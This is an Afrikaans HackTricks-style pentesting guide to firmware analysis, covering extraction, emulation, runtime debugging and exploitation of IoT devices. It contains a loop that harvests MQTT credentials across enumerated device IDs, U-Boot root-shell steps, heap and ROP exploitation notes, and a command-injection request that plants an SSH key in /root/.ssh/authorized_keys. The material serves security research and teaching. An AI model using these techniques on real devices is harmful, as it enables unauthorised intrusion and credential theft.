# Firmware-analise

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Inleiding**

### Verwante hulpbronne

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware is noodsaaklike sagteware wat toestelle korrek laat werk deur kommunikasie tussen die hardewarekomponente en die sagteware waarmee gebruikers interaksie het, te bestuur en te fasiliteer. Dit word in permanente geheue gestoor, sodat die toestel toegang tot belangrike instruksies het sodra dit aangeskakel word, wat die bedryfstelsel laat begin. Die ondersoek en moontlike wysiging van firmware is ’n kritieke stap om sekuriteitskwesbaarhede te identifiseer.<sup>[[2]](#references)[[3]](#references)</sup>

## **Inligting insamel**

**Inligting insamel** is ’n kritieke eerste stap om ’n toestel se samestelling en die tegnologieë wat dit gebruik, te verstaan. Hierdie proses behels die insameling van data oor:

- Die CPU-argitektuur en bedryfstelsel wat dit gebruik
- Besonderhede oor die bootloader
- Hardeware-uitleg en datasheets
- Metrieke oor die kodebasis en bronliggings
- Eksterne biblioteke en lisensietipes
- Opdateringsgeskiedenis en regulatoriese sertifisering
- Argitektuur- en vloeidiagramme
- Sekuriteitsbeoordelings en geïdentifiseerde kwesbaarhede

Vir hierdie doel is **open-source intelligence (OSINT)**-nutsmiddels van onskatbare waarde, net soos die ontleding van enige beskikbare open-source-sagtewarekomponente deur handmatige en geoutomatiseerde hersieningsprosesse. Nutsmiddels soos [Coverity Scan](https://scan.coverity.com) en [Semmle’s LGTM](https://lgtm.com/#explore) bied gratis statiese ontleding wat gebruik kan word om potensiële probleme te vind.

## **Firmware verkry**

Firmware kan op verskeie maniere verkry word, elk met sy eie vlak van kompleksiteit:

- **Direk** vanaf die bron (ontwikkelaars, vervaardigers)
- Deur dit volgens verskafte instruksies te **bou**
- Deur dit van amptelike ondersteuningswebwerwe af te **laai**
- Deur **Google dork**-navrae te gebruik om firmwarelêers te vind wat gehuisves word
- Deur direk toegang tot **cloud storage** te verkry, met nutsmiddels soos [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Deur **opdaterings** met man-in-the-middle-tegnieke te onderskep
- Deur dit van die toestel af te **haal** via verbindings soos **UART**, **JTAG** of **PICit**
- Deur binne toestelkommunikasie vir opdateringsversoeke te **snuffel**
- Deur **hardcoded opdateringseindpunte** te identifiseer en te gebruik
- Deur dit van die bootloader of netwerk af te **dump**
- Deur die stoorskyfie te **verwyder en te lees**, wanneer niks anders werk nie, met geskikte hardewarenutsmiddels

### Slegs UART-logs: forseer ’n root shell via U-Boot env in flash

As UART RX geïgnoreer word (slegs logs), kan jy steeds ’n init shell forseer deur die **U-Boot environment blob** vanlyn te wysig:<sup>[[6]](#references)</sup>

1. Dump SPI-flash met ’n SOIC-8-clip en programmeerder (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Vind die U-Boot env-partisie, wysig `bootargs` om `init=/bin/sh` in te sluit, en **bereken die U-Boot env CRC32 vir die blob opnuut**.
3. Herflits slegs die env-partisie en herlaai; ’n shell behoort op UART te verskyn.

Dit is nuttig op ingebedde toestelle waar die selflaaiprogram se shell gedeaktiveer is, maar die env-partisie via eksterne flash-toegang geskryf kan word.

## Ontleding van die firmware

Noudat jy **die firmware het**, moet jy inligting daaroor onttrek om te weet hoe om dit te hanteer. Jy kan verskeie hulpmiddels hiervoor gebruik:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

As jy nie veel met daardie nutsgoed vind nie, kyk na die **entropie** van die image met `binwalk -E <bin>`; as die entropie laag is, is dit waarskynlik nie geënkripteer nie. As die entropie hoog is, is dit waarskynlik geënkripteer (of op een of ander manier saamgepers).

Jy kan ook hierdie nutsgoed gebruik om **lêers wat in die firmware ingebed is, te onttrek**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Of [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) om die lêer te inspekteer.

### Kry die lêerstelsel

Met die bogenoemde nutsgoed, soos `binwalk -ev <bin>`, behoort jy die **lêerstelsel te kon onttrek**.\
Binwalk onttrek dit gewoonlik in ’n **vouer wat na die lêerstelseltipe vernoem is**, wat gewoonlik een van die volgende is: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Handmatige onttrekking van die lêerstelsel

Soms sal binwalk **nie die magic byte van die lêerstelsel in sy signatures hê nie**. Gebruik in sulke gevalle binwalk om **die lêerstelsel se offset te vind, die saamgeperste lêerstelsel uit die binêre lêer te carve** en **die lêerstelsel handmatig te onttrek** volgens sy tipe, met behulp van die stappe hieronder.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Voer die volgende **dd-opdrag** uit om die Squashfs-lêerstelsel uit te sny.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatiewelik kan die volgende opdrag ook uitgevoer word.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Vir squashfs (wat in die voorbeeld hierbo gebruik word)

`$ unsquashfs dir.squashfs`

Lêers sal daarna in die gids "`squashfs-root`" wees.

- CPIO-argieflêers

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Vir jffs2-lêerstelsels

`$ jefferson rootfsfile.jffs2`

- Vir ubifs-lêerstelsels met NAND-flitsgeheue

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Ontleding van firmware

Sodra die firmware verkry is, is dit noodsaaklik om dit te dissekteer om die struktuur en moontlike kwesbaarhede daarvan te verstaan. Hierdie proses behels die gebruik van verskeie nutsmiddels om waardevolle data uit die firmware-beeld te ontleed en te onttrek.

### Aanvanklike ontledingsnutsmiddels

’n Stel opdragte word verskaf vir aanvanklike inspeksie van die binêre lêer (waarna verwys word as `<bin>`). Hierdie opdragte help met die identifisering van lêertipes, die onttrekking van stringe, die ontleding van binêre data en die begrip van partisie- en lêerstelselbesonderhede:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Om die enkripsiestatus van die beeld te bepaal, word die **entropie** met `binwalk -E <bin>` nagegaan. Lae entropie dui op ’n gebrek aan enkripsie, terwyl hoë entropie op moontlike enkripsie of kompressie dui.

Vir die onttrekking van **ingebedde lêers** word nutsgoed en hulpbronne soos die **file-data-carving-recovery-tools**-dokumentasie en **binvis.io** vir lêerinspeksie aanbeveel.

### Onttrekking van die lêerstelsel

Met `binwalk -ev <bin>` kan ’n mens gewoonlik die lêerstelsel onttrek, dikwels na ’n gids wat na die lêerstelseltipe vernoem is (bv. squashfs, ubifs). Wanneer **binwalk** egter nie die lêerstelseltipe herken nie weens ontbrekende magic bytes, is handmatige onttrekking nodig. Dit behels dat `binwalk` gebruik word om die lêerstelsel se offset op te spoor, gevolg deur die `dd`-opdrag om die lêerstelsel uit te sny:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Daarna word verskillende opdragte gebruik om die inhoud handmatig uit te pak, afhangend van die lêerstelseltipe (bv. squashfs, cpio, jffs2, ubifs).

### Lêerstelselontleding

Sodra die lêerstelsel uitgepak is, begin die soektog na sekuriteitsfoute. Daar word gelet op onveilige netwerkdaemons, hardgekodeerde geloofsbriewe, API-eindpunte, funksionaliteit van opdateringsbedieners, ongecompileerde kode, opstartskripte en gecompileerde binaries vir vanlyn ontleding.

**Sleutelliggings** en **items** om te inspekteer, sluit in:

- **etc/shadow** en **etc/passwd** vir gebruikersgeloofsbriewe
- SSL-sertifikate en -sleutels in **etc/ssl**
- Konfigurasie- en skriplêers vir moontlike kwesbaarhede
- Ingebedde binaries vir verdere ontleding
- Algemene IoT-toestelwebbedieners en binaries

Verskeie nutsmiddels help om sensitiewe inligting en kwesbaarhede in die lêerstelsel op te spoor:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) en [**Firmwalker**](https://github.com/craigz28/firmwalker) om na sensitiewe inligting te soek
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) vir omvattende firmware-ontleding
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), en [**EMBA**](https://github.com/e-m-b-a/emba) vir statiese en dinamiese ontleding

### Sekuriteitskontroles op gecompileerde binaries

Die bronkode en gecompileerde binaries wat in die lêerstelsel gevind word, moet albei vir kwesbaarhede ondersoek word. Nutsmiddels soos **checksec.sh** vir Unix-binaries en **PESecurity** vir Windows-binaries help om onbeskermde binaries te identifiseer wat uitgebuit kan word.

## Oes van wolkkonfigurasie en MQTT-geloofsbriewe via afgeleide URL-tokens

Baie IoT-hubs haal hul toestelspesifieke konfigurasie vanaf ’n wolkeindpunt wat soos volg lyk:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tydens firmware-ontleding kan jy ontdek dat `<token>` plaaslik van die toestel-ID afgelei word met behulp van ’n hardgekodeerde geheim, byvoorbeeld:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Hierdie ontwerp stel enigiemand wat ’n deviceId en die STATIC_KEY bekom in staat om die URL te herskep en die wolkkonfigurasie af te haal, wat dikwels MQTT-geloofsbriewe in gewone teks en onderwerpvoorvoegsels blootlê.

Praktiese werksvloei:

1) Onttrek deviceId uit UART-opstartlogboeke

- Koppel ’n 3.3V UART-adapter (TX/RX/GND) aan en neem die logboeke vas:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Soek na reëls wat die cloud config-URL-patroon en broker-adres afdruk, byvoorbeeld:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Herwin STATIC_KEY en token-algoritme uit firmware

- Laai binaries in Ghidra/radare2 en soek na die config-pad ("/pf/") of MD5-gebruik.
- Bevestig die algoritme (bv. MD5(deviceId||STATIC_KEY)).
- Lei die token in Bash af en maak die digest hoofletters:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Versamel cloud-konfigurasie en MQTT-aanmeldbewyse

- Stel die URL saam en haal JSON op met curl; ontleed dit met jq om geheime te onttrek:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Misbruik plaintext MQTT en swak topic-ACL's (indien teenwoordig)

- Gebruik herwonne geloofsbriewe om op maintenance topics in te teken en na sensitiewe gebeurtenisse te soek:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Lys voorspelbare toestel-ID's op (op skaal, met magtiging)

- Baie ekosisteme sluit verskaffer-OUI-/produk-/tipe-grepe in, gevolg deur 'n opeenvolgende agtervoegsel.
- Jy kan kandidaat-ID's itereer, tokens aflei en configs programmaties ophaal:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notas
- Verkry altyd uitdruklike toestemming voordat jy mass enumeration probeer.
- Verkies emulasie of statiese analise om geheime te herwin sonder om die teikentoerusting te wysig, waar moontlik.


Die proses om firmware te emuleer, maak **dinamiese analise** van óf ’n toestel se werking óf ’n individuele program moontlik. Hierdie benadering kan uitdagings met hardeware- of argitektuurafhanklikhede oplewer, maar die oordrag van die root-lêerstelsel of spesifieke binaries na ’n toestel met ’n ooreenstemmende argitektuur en endianness, soos ’n Raspberry Pi, of na ’n voorafgeboude virtuele masjien, kan verdere toetsing vergemaklik.

### Emulering van individuele binaries

Wanneer jy enkele programme ondersoek, is dit noodsaaklik om die program se endianness en SVE-argitektuur te bepaal.

#### Voorbeeld met MIPS-argitektuur

Om ’n binêre lêer vir MIPS-argitektuur te emuleer, kan jy die opdrag gebruik:

```bash
file ./squashfs-root/bin/busybox
```

En om die nodige emulasienutsgoed te installeer:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Vir MIPS (big-endian) word `qemu-mips` gebruik, en vir little-endian-binaries is `qemu-mipsel` die keuse.

#### Emulasie van ARM-argitektuur

Vir ARM-binaries is die proses soortgelyk, met die `qemu-arm`-emulator wat vir emulasie gebruik word.

### Volledige stelselemulasie

Gereedskap soos [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) en ander vergemaklik volledige firmware-emulasie, outomatiseer die proses en help met dinamiese analise.

### Rekonstruksie van gesplitste en geverifieerde wortellêerstelsels vir emulasie

As ’n SquashFS-superblok leesbaar is, maar die inode-, gids- of fragmenttabel-offsets onmoontlik is, moet jy nie dadelik `unsquashfs` patch nie. Reverse-engineer die vroeë selflaaibinary en reproduseer die bloktoestelgrafiek wat dit skep: ingebedde stelsels kan ’n nominale wortelpartisie blootstel, maar die werklike lêerstelsel met ’n `dm-linear`-kartering saamstel wat sektore byvoeg wat by ’n ander partisie geleen is. Kontroles wat net die superblok nagaan, kan slaag selfs wanneer elke daaropvolgende metadatablok verskuif is.<sup>[[9]](#references)</sup>

Behoud die firmware se rekenkunde presies. Bepaal veral of lengtes in grepe, 512-greep-sektore of 4 KiB-bladsye uitgedruk word; reproduseer verskuiwings en afkapping in hul oorspronklike volgorde; en neem bankafhanklike stertstreke in A/B-uitlegte in ag. Byvoorbeeld, `(partition_bytes >> 12) << 3` kap eers af tot ’n 4 KiB-grens en druk die resultaat daarna in 512-greep-sektore uit; as jy dit vervang met `partition_bytes // 512`, kan die bygevoegde omvang met ’n paar kilogrepe verskuif en alle daaropvolgende SquashFS-tabelle beskadig.<sup>[[9]](#references)</sup>

’n Nuttige valideringswerkvloei is:<sup>[[9]](#references)</sup>

1. Herwin elke `dm-linear`-segment se brontoestel, begindektor en lengte uit die verifier-/init-binary.
2. Voeg die omvangs saam of karteer hulle sonder om hul belyningssemantiek te verander.
3. As ekstraksie steeds misluk, soek slegs ’n klein venster rondom die voorspelde grens en vereis verskeie opeenvolgende geldige metadatastrukture, eerder as om net ’n geloofwaardige superblok te aanvaar.
4. Laat ’n onveranderde `unsquashfs` teen die gerekonstrueerde image loop; suksesvolle deurkruising van al die gidse en fragmente is sterker bewys as `unsquashfs -stat`.

#### Ontleder-beheerde dm-verity-vervanging

Wanneer die ontleder die QEMU-kernel, initramfs en virtuele skywe beheer, kan ’n gewysigde wortel gelaai word deur die verskaffer se verifikasie-PID 1 met ’n klein staties-gekoppelde init te vervang. Dit is ’n **lab boot-chain substitution**, nie ’n verbreking van dm-verity, sy RSA-handtekening, Secure Boot of ’n TPM-verseëlde sleutel nie.<sup>[[9]](#references)</sup>

Die vervangende init behoort die operasionele dele van die oorspronklike selflaaipad na te boots: mount `devtmpfs`, roep `setsid()` aan, koppel `/dev/console` aan lêerbeskrywers 0–2, mount `/proc` en `/sys`, wag vir die verskafte bloktoestel, mount die geredigeerde wortel as leesalleen, ontkoppel die ou-wortel-pseudo-lêerstelsels, skuif die nuwe mount na `/`, voer `chroot` uit en roep die firmware se oorspronklike `/sbin/init` met `execve()` aan. Deur `/dev`, `/proc` en `/sys` **voor** `MS_MOVE` te ontkoppel, voorkom jy dat mount-punte wat aan die nuwe wortel behoort per ongeluk ontkoppel word.<sup>[[9]](#references)</sup>

Hou veranderbare toesteltoestand apart van die gewysigde onveranderlike wortel. ’n qcow2-overlay kan die oorspronklike skyf se LVM-toestand behou terwyl ’n tweede leesalleen virtio-skyf die geredigeerde SquashFS verskaf:<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Vanlyn debugging van image-toestand

Ondersoek volgehoue toestand buite die guest wanneer stadige opstarts, vernietigende opstartskripte of onbetroubare console-logging die fout verbloem. Moet nooit ’n overlay koppel wat ’n lopende VM gebruik nie; stel dit beskikbaar met `qemu-nbd`, beperk LVM-ontdekking tot die bedoelde NBD-partisie en deaktiveer die volume group voordat jy dit ontkoppel.<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Vir herhaalbare foutisolasie, skryf tydstempelmerkerlêers na ’n stabiele skryfbare volume en verifieer dit vanlyn; `/dev/kmsg`, FIFOs en tydelike konsoles kan vals negatiewe oplewer weens tempobeperking of vroeë prosesbeëindiging. Vergelyk ook presiese koppelvlakke oor lae heen voordat jy onverwante kode verander: `uname -r` teenoor `/lib/modules/`, ext4-kenmerke op skyf teenoor kernkonfigurasie, en die Mesa `libGL`-generasie teenoor die DRI-drywer-ABI en drywername wat van PCI afgelei is. ’n Komponent kan bestaan en selfs suksesvol `dlopen()` word, maar steeds onbruikbaar wees omdat die verbruiker ’n ander ABI verwag.<sup>[[9]](#references)</sup>

## Dinamiese analise in die praktyk

Op hierdie stadium word óf ’n werklike óf ’n geëmuleerde toestelomgewing vir analise gebruik. Dit is noodsaaklik om shell-toegang tot die bedryfstelsel en lêerstelsel te behou. Emulasie boots hardeware-interaksies dalk nie perfek na nie, wat dit soms nodig maak om die emulasie te herbegin. Analise behoort die lêerstelsel weer te ondersoek, blootgestelde webblaaie en netwerkdienste te exploit, en kwesbaarhede in die bootloader te verken. Firmware-integriteitstoetse is noodsaaklik om moontlike agterdeurkwesbaarhede te identifiseer.

## Runtime-analise-tegnieke

Runtime-analise behels interaksie met ’n proses of binêre lêer in sy bedryfsomgewing. Hiervoor word nutsmiddels soos gdb-multiarch, Frida en Ghidra gebruik om breekpunte in te stel en kwesbaarhede deur fuzzing en ander tegnieke te identifiseer.

Vir ingebedde teikens sonder ’n volledige ontfouter, **kopieer ’n staties gekoppelde `gdbserver`** na die toestel en koppel op afstand daaraan:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor-boodskapkartering

Op IoT-hubs word die RF-stack dikwels tussen ’n **radio-MCU** en ’n Linux-userland-proses verdeel. ’n Nuttige werkvloei is om die pad te karteer:<sup>[[8]](#references)</sup>

1. **RF-raam** oor die lug
2. **beheerderkant-ontleder** op die radio-MCU
3. **seriële/UART-teks- of TLV-protokol** wat na Linux aangestuur word (byvoorbeeld `/dev/tty*`)
4. **toepassingsdispatcher** in die hoofdemon
5. **protokolspesifieke handler / toestandsmasjien**

Hierdie argitektuur skep twee teikens vir reverse engineering in plaas van een. As die beheerder binêre radiokrame na ’n teksprotokol soos `Group,Command,arg1,arg2,...` omskakel, vind die volgende:

- Die **boodskapgroepe** en dispatch-tabelle
- Watter boodskappe van die **netwerk** kan kom teenoor dié wat van die beheerder self kom
- Die presiese **vervaardigerspesifieke diskrimineerdervelde** (byvoorbeeld Zigbee `manufacturer_code` en pasgemaakte `cluster_command`)
- Watter handlers slegs tydens **commissioning**, ontdekking of firmware-/modelaflaaifases bereikbaar is

Vir Zigbee, neem veral paringverkeer op en kyk of die teiken steeds op die verstek-**Link Key** `ZigBeeAlliance09` staatmaak. Indien wel, kan die afluistering van commissioning-verkeer die **Network Key** blootlê. Zigbee 3.0-install codes verminder hierdie blootstelling; stel dus vas of die getoetste toestel dit werklik afdwing.

### Vervaardigerspesifieke protokolhandlers en FSM-beheerde bereikbaarheid

Vervaardigerspesifieke Zigbee/ZCL-opdragte is dikwels ’n beter teiken as gestandaardiseerde clusters, omdat hulle **pasgemaakte ontledingskode** en interne **FSM’s** met minder deurgevegte validering aanroep.<sup>[[8]](#references)</sup>

Praktiese werkvloei:

- Reverse-engineer die opdragdispatcher totdat jy die **slegs-vervaardiger-handler** vind.
- Herwin die **FSM-toestand**-, **gebeurtenis**-, **kontrole**-, **aksie**- en **volgende-toestand**-tabelle.
- Identifiseer **oorgangstoestande** wat outomaties voortgaan, asook herproef-/foutvertakkings wat uiteindelik aanvallerbeheerde toestand terugstel of vrystel.
- Bevestig watter wettige protokoluitruilings nodig is om die daemon in die kwesbare toestand te plaas; moenie aanvaar dat die foutiewe handler altyd bereikbaar is nie.

Vir tydsensitiewe protokolle kan pakketherhaling vanuit ’n Python-framework te stadig wees. ’n Betroubaarder benadering is om ’n wettige toestel op regte hardeware na te boots (byvoorbeeld ’n **nRF52840**) met ’n vervaardigervlak-stack, sodat jy die korrekte **eindpunte**, **eienskappe** en commissioning-tydsberekening kan blootlê.

### Foutklas vir gefragmenteerde aflaaie in ingebedde daemons

’n Herhalende firmware-foutklas kom voor in **gefragmenteerde blob-/model-/konfigurasie-aflaaie**:<sup>[[8]](#references)</sup>

1. Die **eerste fragment** (`offset == 0`) stoor `ctx->total_size` en ken `malloc(total_size)` toe.
2. Latere fragmente valideer slegs die aanvallerbeheerde **pakkieplaaslike** velde, soos `packet_total_size >= offset + chunk_len`.
3. Die kopie gebruik `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sonder om dit teen die **oorspronklike toegekende grootte** te kontroleer.

Dit laat ’n aanvaller toe om:

- ’n Eerste geldige fragment met ’n **klein** verklaarde totale grootte te stuur om ’n klein hooptoekenning af te dwing.
- ’n Latere fragment met die **verwagte offset**, maar ’n groter `chunk_len`, te stuur.
- ’n vervalste pakkieplaaslike grootte te gebruik wat die nuwe kontroles slaag, terwyl die oorspronklik toegekende buffer steeds oorloop.

Wanneer die kwesbare pad agter commissioning-logika sit, moet die uitbuiting genoeg **toestelnabootsing** insluit om die teiken in die verwagte modelaflaai- of blobaflaaitoestand te bring voordat die misvormde fragmente gestuur word.

### Protokolgedrewe `free()`-snellers

In ingebedde daemons is die maklikste manier om hoopmetadata-uitbuiting te aktiveer dikwels nie om “vir opruiming te wag” nie, maar om **die protokol se eie foutafhandeling af te dwing**:<sup>[[8]](#references)</sup>

- Stuur misvormde opvolgfragmente om die FSM na **herprobeer-** of **fouttoestande** te dryf.
- Oorskry die herproefdrempel sodat die daemon die **konteks terugstel** en die beskadigde buffer vrystel.
- Gebruik hierdie voorspelbare `free()` om allokatorkant-primitiewe te aktiveer voordat die proses om onverwante redes ineenstort.

Dit is veral nuttig teen **musl/uClibc/dlmalloc-agtige** allokators in ingebedde Linux, waar die beskadiging van stukmetadata unlink-/unbin-logika in ’n skryfprimitief kan omskep. ’n Stabiele patroon is om ’n **grootteveld** te beskadig om allokatornavigasie na **vals stukke wat binne die oorvloeiende buffer geplaas is** te herlei, eerder as om onmiddellik werklike bin-wysers te beskadig en die proses te laat ineenstort.

## Binêre uitbuiting en bewys-van-konsep

Die ontwikkeling van ’n PoC vir geïdentifiseerde kwesbaarhede vereis ’n diep begrip van die teikenargitektuur en programmering in laervlaktale. Binêre looptydbeskermings is skaars in ingebedde stelsels, maar wanneer dit voorkom, kan tegnieke soos Return Oriented Programming (ROP) nodig wees.

### uClibc-fastbin-uitbuitingsnotas (ingebedde Linux)

- **Fastbins + konsolidasie:** uClibc gebruik fastbins soortgelyk aan glibc. ’n Latere groot toekenning kan `__malloc_consolidate()` aktiveer, dus moet enige vals stuk kontroles slaag (geldige grootte, `fd = 0` en omliggende stukke wat as “in gebruik” beskou word).<sup>[[6]](#references)</sup>
- **Nie-PIE-binêre lêers onder ASLR:** as ASLR geaktiveer is, maar die hoofbinêre lêer **nie-PIE** is, is `.data/.bss`-adresse binne die binêre lêer stabiel. Jy kan ’n gebied teiken wat reeds soos ’n geldige hoopstukopskrif lyk, om ’n fastbin-toekenning op ’n **funksiewysertabel** te laat beland.
- **NUL wat die ontleder stop:** wanneer JSON ontleed word, kan ’n `\x00` in die loonvrag ontleding stop terwyl dit agterste aanvallerbeheerde grepe vir ’n stapelspil/ROP-ketting behou.
- **Shellcode via `/proc/self/mem`:** ’n ROP-ketting wat `open("/proc/self/mem")`, `lseek()` en `write()` aanroep, kan uitvoerbare shellcode in ’n bekende kartering plaas en daarheen spring.

## Voorafopgestelde bedryfstelsels vir firmware-analise

Bedryfstelsels soos [AttifyOS](https://github.com/adi0x90/attifyos) en [EmbedOS](https://github.com/scriptingxss/EmbedOS) bied voorafopgestelde omgewings vir firmwaresekuriteitstoetsing, toegerus met die nodige nutsgoed.

## Voorafopgestelde OS’e om firmware te ontleed

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is ’n distro wat bedoel is om jou te help met sekuriteitsassessering en penetrasietoetsing van Internet of Things (IoT)-toestelle. Dit spaar jou baie tyd deur ’n voorafopgestelde omgewing met al die nodige nutsgoed te bied.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): ’n Bedryfstelsel vir ingebedde sekuriteitstoetsing, gebaseer op Ubuntu 18.04 en vooraf gelaai met nutsgoed vir firmwaresekuriteitstoetsing.

## Firmware-afgraderingsaanvalle en onveilige opdateringsmeganismes

Selfs wanneer ’n vervaardiger kriptografiese handtekeningkontroles vir firmwarebeelde implementeer, word **weergawe-terugrolbeskerming (afgraderingsbeskerming)** dikwels weggelaat. Wanneer die selflaai- of herstel-laaier slegs die handtekening met ’n ingebedde publieke sleutel verifieer, maar nie die *weergawe* (of ’n monotone teller) van die beeld wat geflits word vergelyk nie, kan ’n aanvaller wettiglik ’n **ouer, kwesbare firmware installeer wat steeds ’n geldige handtekening dra**, en sodoende gelapte kwesbaarhede weer invoer.<sup>[[4]](#references)</sup>

Tipiese aanvalswerkvloei:

1. **Kry ’n ouer ondertekende beeld**
   * Kry dit vanaf die vervaardiger se openbare aflaaiportaal, CDN of ondersteuningswebwerf.
   * Onttrek dit uit metgesel-mobiele-/rekenaartoepassings (bv. binne ’n Android APK onder `assets/firmware/`).
   * Kry dit van derdeparty-bewaarplekke soos VirusTotal, internetargiewe, forums, ens.
2. **Laai die beeld op na of bedien dit aan die toestel** via enige blootgestelde opdateringskanaal:
   * Web-UI, mobiele-toepassing-API, USB, TFTP, MQTT, ens.
   * Baie IoT-toestelle vir verbruikers stel *ongeverifieerde* HTTP(S)-eindpunte bloot wat Base64-geënkodeerde firmwaregrepe aanvaar, dit bedienerkant dekodeer en herstel/opgradering aktiveer.
3. Ná die afgradering, buit ’n kwesbaarheid uit wat in die nuwer weergawe reggemaak is (byvoorbeeld ’n opdraginspuitingsfilter wat later bygevoeg is).
4. Flits opsioneel die nuutste beeld terug of deaktiveer opdaterings om opsporing te vermy nadat volharding verkry is.

### Voorbeeld: Opdraginspuiting ná afgradering

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

In die kwesbare (afgegradeerde) firmware word die `md5`-parameter direk sonder sanitering by ’n shell-opdrag gevoeg, wat die inspuiting van arbitrêre opdragte moontlik maak (hier – om root-toegang via SSH-sleutels te aktiveer). Latere firmwareweergawes het ’n basiese karakterfilter bygevoeg, maar die gebrek aan beskerming teen afgradering maak die regstelling nutteloos.<sup>[[4]](#references)</sup>

### Firmware uit mobiele apps onttrek

